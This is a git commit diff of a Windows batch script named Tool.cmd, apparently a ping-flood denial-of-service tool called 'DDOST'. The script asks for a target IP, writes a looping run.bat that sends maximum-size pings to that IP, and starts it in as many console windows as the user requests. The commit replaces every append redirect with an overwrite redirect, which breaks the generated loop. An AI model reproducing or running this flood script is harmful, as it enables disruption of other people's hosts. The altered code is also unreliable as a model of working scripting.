eb01e6a2ed7ce4b4e087d7a599ee38aac3cdbcce
AuraProgramming <83914971+AuraProgramming@users.noreply.github.com>
2021-10-13 15:44:51 -0400

    Update Tool.cmd

--- Tool.cmd
+++ Tool.cmd
@@ -3,7 +3,7 @@
 
 if exist %userprofile%\key goto skip
   cls
-  echo verifiedbypass>>%userprofile%\key
+  echo verifiedbypass>%userprofile%\key
   md %temp%\DDOST\
   md %userprofile%\.ddost\
   md %userprofile%\.ddost\data\
@@ -16,11 +16,11 @@ if exist %userprofile%\key goto skip
       echo Amount of windows:
   set /p windows=
     cls
-      echo @echo off>>"%temp%\DDOST\run.bat"
-      echo :loop>>"%temp%\DDOST\run.bat"
-      echo if exist "%userprofile%\.ddost\data\exit.dat" exit>>"%temp%\DDOST\run.bat"
-      echo ping %ip% -n 1 -l 65500>>"%temp%\DDOST\run.bat"
-      echo goto loop>>"%temp%\DDOST\run.bat"
+      echo @echo off>"%temp%\DDOST\run.bat"
+      echo :loop>"%temp%\DDOST\run.bat"
+      echo if exist "%userprofile%\.ddost\data\exit.dat" exit>"%temp%\DDOST\run.bat"
+      echo ping %ip% -n 1 -l 65500>"%temp%\DDOST\run.bat"
+      echo goto loop>"%temp%\DDOST\run.bat"
       echo Minimize Windows (Y/N):
   set /p mintf=
     cls
@@ -31,7 +31,7 @@ for /l %%A in (1,1,%windows%) do start %mintf% "cmd.exe" "%temp%\DDOST\run.bat"
 echo Press any button to exit
   pause >nul
     del /q "%temp%\DDOST\run.bat"
-    echo EXIT>>%userprofile%\.ddost\data\exit.dat
+    echo EXIT>%userprofile%\.ddost\data\exit.dat
     timeout /t 1
     del /q "%userprofile%\.ddost\data\exit.dat"
     exit
